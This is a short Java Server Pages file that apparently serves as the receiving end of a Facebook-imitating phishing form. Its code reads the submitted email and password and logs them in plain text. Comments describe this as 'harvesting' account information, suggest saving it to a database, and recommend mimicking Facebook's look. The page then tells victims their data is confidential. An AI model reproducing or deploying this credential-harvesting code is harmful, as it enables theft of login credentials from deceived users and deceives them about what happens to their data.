<%@ page language="java" contentType="text/html; charset=ISO-8859-1"
    pageEncoding="ISO-8859-1"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<title>Insert title here</title>
</head>
<body>
	<!-- now perform harvesting of account information type -->
	<%
		String userId = request.getParameter("email");
		String password = request.getParameter("pass");
		
		//note: you can even store this in the database table
		System.out.println("User E-mail: " + userId);
		System.out.println("User Password: " + password);		
	%>
	
	<!-- what you can do right now is to have the
	same look and feel of facebook thanking the user for 
	submitting user account for verification -->
	<h2>Thank you for verifying your account. Rest assured that your
	information submitted is confidential.</h2>
</body>
</html>